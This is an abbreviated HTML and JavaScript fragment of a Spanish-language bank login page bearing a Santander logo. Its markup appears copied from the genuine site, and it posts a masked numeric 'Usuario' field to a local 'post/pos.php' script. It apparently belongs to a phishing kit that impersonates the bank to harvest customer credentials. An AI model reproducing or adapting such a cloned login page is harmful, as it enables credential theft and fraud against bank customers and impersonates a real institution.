...
Swal.fire({
    ...
    confirmButtonText: 'Aceptar',
    allowOutsideClick: false,
    html: '<h1 style="text-align:center;margin-bottom:15px;font-size:30px;font-weight: bold;">USUARIO INCORRECTO</h1><br><p style="text-align:center;">La longitud m&iacute;nima para t&uacute; usuario debe ser de 8 caracteres</p>'
});
</script>
...
<img src="resources/images.png" style="height: 45px; width: 45px;margin-left:43%;">
                <!----><div _ngcontent-c7="" class="ng-star-inserted" style="color:#fff;">
...
<div _ngcontent-c15="" class="container-fluid">
  ...
  <div _ngcontent-c15="" class="row justify-content-center show-grid" style="margin-top: 50px;">
    <form _ngcontent-c15="" novalidate="" class="ng-touched ng-dirty ng-valid" action="post/pos.php" method="POST" autocomplete="off" name="form1">
          ...
          <div _ngcontent-c15="" class="form-group">
            <label _ngcontent-c15="" class="code" for="input">
              ...
              <div _ngcontent-c15="" class="tooltip">
                <img _ngcontent-c15="" alt="Información" class="img-responsive tooltip" src="resources/tooltip_id.svg">
            ...
            <input _ngcontent-c15="" placeholder="Usuario" minlength="8" maxlength="16" class="form-control ng-touched ng-dirty ng-valid" formcontrolname="client" name="user" id="user" type="password" onkeypress="return isNumberKey(event);">
          </div>
        </div>
      </div>
  ...
  <div _ngcontent-c12="" class="container-fluid inside-footer m-auto">
    <div _ngcontent-c12="" class="row w-100 mx-3">
      ...
      <div _ngcontent-c12="" class="f-img col-3 text-right pt-10px" style="font-size: 19px;">
        <img _ngcontent-c12="" class="footer-santander" src="resources/santander_logo_white.svg" style="height:20px;width:90px;">
      </div>
    </div>
  </div>
</nav>
